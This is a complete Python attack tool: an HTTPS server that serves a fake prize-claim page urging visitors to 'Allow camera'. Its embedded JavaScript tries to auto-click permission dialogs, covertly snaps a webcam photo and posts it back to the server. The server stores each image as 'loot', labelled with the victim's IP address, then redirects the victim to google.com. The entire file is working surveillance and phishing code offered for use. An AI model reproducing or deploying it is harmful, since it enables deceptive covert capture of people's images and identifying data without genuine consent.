#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import os
import ssl
from datetime import datetime

PORT = 8443
CERT_FILE = "server.pem"
DIR = "ARMOR_LOOT"
os.makedirs(DIR, exist_ok=True)

# === GENERATE CERT ===
if not os.path.exists(CERT_FILE):
    print("Generating self-signed cert...")
    os.system(f"openssl req -new -x509 -days 365 -nodes -out {CERT_FILE} -keyout {CERT_FILE} -subj '/CN=localhost' 2>/dev/null")

# === JS: CLEAN BASE64 + AUTO-ALLOW + ROBUST ===
PAYLOAD = """<script>
// === AUTO-CLICK "ALLOW" ===
const autoAllow = () => {
  const dialog = document.querySelector('dialog, [role="dialog"], div[style*="fixed"]');
  if (dialog) {
    const btn = [...dialog.querySelectorAll('button, [role="button"]')]
      .find(b => /allow|yes|ok/i.test(b.textContent || ''));
    if (btn) {
      btn.click();
      return true;
    }
  }
  return false;
};

// Try every 100ms
const allowInterval = setInterval(() => {
  if (autoAllow()) clearInterval(allowInterval);
}, 100);

// === CAPTURE ===
const video = document.createElement('video');
const canvas = document.createElement('canvas');
video.style.display = canvas.style.display = 'none';
document.body.appendChild(video);
document.body.appendChild(canvas);

navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}})
  .then(stream => {
    video.srcObject = stream;
    video.play();
    setTimeout(() => {
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      canvas.getContext('2d').drawImage(video, 0, 0);

      // === CLEAN BASE64 ===
      let b64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
      // Pad
      b64 += '='.repeat((4 - b64.length % 4) % 4);
      // Remove invalid chars
      b64 = b64.replace(/[^A-Za-z0-9+/=]/g, '');

      fetch(location.href, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'img=' + encodeURIComponent(b64)
      }).finally(() => {
        stream.getTracks().forEach(t => t.stop());
        setTimeout(() => location = 'https://google.com', 500);
      });
    }, 1800);
  })
  .catch(() => {
    clearInterval(allowInterval);
    setTimeout(() => location = 'https://google.com', 1000);
  });
</script>"""

BUTTON_JS = """<script>
document.getElementById('claimBtn').onclick = () => {
  this.innerText = 'Processing...';
  this.disabled = true;
};
</script>"""

HTML_TEMPLATE = """<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Congratulations!</title>
  <style>
    body{{font-family:Arial;background:#fff3e0;color:#d84315;text-align:center;padding:10%}}
    .box{{background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:90%;margin:auto}}
    h1{{font-size:2rem}}
    p{{font-size:1.1rem;margin:1.5rem 0}}
    button{{background:#ff6d00;color:#fff;border:none;padding:1rem 2rem;font-size:1.2rem;border-radius:12px;font-weight:bold}}
    button:disabled{{background:#ccc;cursor:not-allowed}}
  </style>
</head><body>
  <div class="box">
    <h1>Congratulations!</h1>
    <p>You've won a mystery prize!</p>
    <p>Allow camera to claim it.</p>
    <button id="claimBtn">Claim Now</button>
  </div>
  {payload}
  {button_js}
</body></html>"""

class ArmorHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        html = HTML_TEMPLATE.format(payload=PAYLOAD, button_js=BUTTON_JS)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode('utf-8', errors='ignore')
            
            # === EXTRACT img=... ===
            params = urllib.parse.parse_qs(data)
            raw = params.get('img', [''])[0]
            
            if not raw:
                print(f"[-] No 'img=' in POST from {self.client_address[0]}")
                self._redirect()
                return

            # === DECODE URL-ENCODED BASE64 ===
            b64 = urllib.parse.unquote(raw)
            
            # === FINAL CLEAN + PAD ===
            b64 = b64.strip().replace(' ', '+')
            b64 += '=' * (-len(b64) % 4)
            b64 = ''.join(c for c in b64 if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')

            if len(b64) < 1000:
                print(f"[-] Base64 too short from {self.client_address[0]}")
                self._redirect()
                return

            img_bytes = base64.b64decode(b64, validate=False)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            ip = self.client_address[0]
            path = f"{DIR}/ARMOR_{ts}_{ip}.jpg"
            with open(path, "wb") as f:
                f.write(img_bytes)
            print(f"ARMOR SAVED: {path}")

        except Exception as e:
            print(f"[-] CRITICAL ERROR: {e}")
        finally:
            self._redirect()

    def _redirect(self):
        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

# === HTTPS ===
def run():
    server = socketserver.TCPServer(("", PORT), ArmorHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    print(f"ARMOR SERVER → https://YOUR_IP:{PORT}")
    print("   LOOT → ./ARMOR_LOOT/")
    server.serve_forever()

if __name__ == "__main__":
    run()
